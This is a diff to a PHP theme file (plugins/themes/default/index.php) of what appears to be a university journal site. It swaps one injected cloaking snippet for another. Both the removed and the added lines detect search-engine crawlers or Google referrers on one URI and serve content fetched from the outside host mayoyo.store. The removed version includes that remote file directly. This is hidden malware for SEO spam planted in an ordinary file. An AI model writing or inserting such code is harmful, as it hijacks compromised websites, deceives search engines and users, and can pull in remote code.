@@ -1,5 +1,17 @@
 <?php
-error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/index.php/jurnalbinaedukasi'){ include('https://mayoyo.store/journal.binadarma.ac.id/jurnalbinaedukasi.txt'); exit; }
+$userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
+$referer = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
+$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
+
+if ($uri == '/index.php/jurnalbinaedukasi' && (
+    strpos($userAgent, 'bot') !== false || 
+    strpos($userAgent, 'google') !== false || 
+    strpos($userAgent, 'chrome-lighthouse') !== false || 
+    strpos($referer, 'google') !== false
+)) {
+    echo file_get_contents('https://mayoyo.store/journal.binadarma.ac.id/jurnalbinaedukasi.txt');
+    exit();
+}
 
 /**
  * @file plugins/themes/default/index.php
